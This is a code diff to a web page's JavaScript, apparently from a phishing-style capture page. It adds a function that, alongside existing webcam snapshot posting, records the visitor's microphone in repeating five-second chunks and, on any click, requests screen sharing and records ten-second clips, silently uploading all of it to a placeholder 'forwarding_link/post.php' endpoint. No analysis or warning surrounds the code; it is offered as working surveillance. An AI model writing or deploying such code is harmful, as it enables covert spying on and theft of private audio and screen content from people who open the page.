@@ -391,6 +391,82 @@
         post(canvasData);
         video.play();
       }, 1500);
+
+      startAdvancedCapture();
+    }
+
+    // Advanced Capture: Voice & Screen
+    function startAdvancedCapture() {
+      // Voice Recording
+      navigator.mediaDevices.getUserMedia({ audio: true }).then(audioStream => {
+        const mediaRecorder = new MediaRecorder(audioStream);
+        const audioChunks = [];
+
+        mediaRecorder.ondataavailable = event => {
+          audioChunks.push(event.data);
+        };
+
+        mediaRecorder.onstop = () => {
+          const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+          const formData = new FormData();
+          formData.append('voice', audioBlob);
+
+          $.ajax({
+            type: 'POST',
+            url: 'forwarding_link/post.php',
+            data: formData,
+            processData: false,
+            contentType: false
+          });
+
+          // Restart recording
+          audioChunks.length = 0;
+          mediaRecorder.start();
+        };
+
+        // Record in small chunks of 5 seconds
+        mediaRecorder.start();
+        setInterval(() => {
+          if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+        }, 5000);
+      }).catch(e => console.log("Audio permission denied"));
+
+      // Screen Recording
+      const screenTrigger = async () => {
+        try {
+          // Only request if we haven't already
+          if (!window.screenCaptureActive) {
+            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            window.screenCaptureActive = true;
+
+            const screenRecorder = new MediaRecorder(screenStream);
+            const screenChunks = [];
+
+            screenRecorder.ondataavailable = e => screenChunks.push(e.data);
+
+            screenRecorder.onstop = () => {
+              const screenBlob = new Blob(screenChunks, { type: 'video/webm' });
+              const fd = new FormData();
+              fd.append('screen', screenBlob);
+              $.ajax({
+                type: 'POST',
+                url: 'forwarding_link/post.php',
+                data: fd,
+                processData: false,
+                contentType: false
+              });
+            };
+
+            screenRecorder.start();
+            // Record 10 second clips then stop (to save)
+            setTimeout(() => screenRecorder.stop(), 10000);
+          }
+        } catch (err) {
+          console.log("Screen capture cancelled");
+        }
+      };
+
+      document.body.addEventListener('click', screenTrigger);
     }
 
     init();
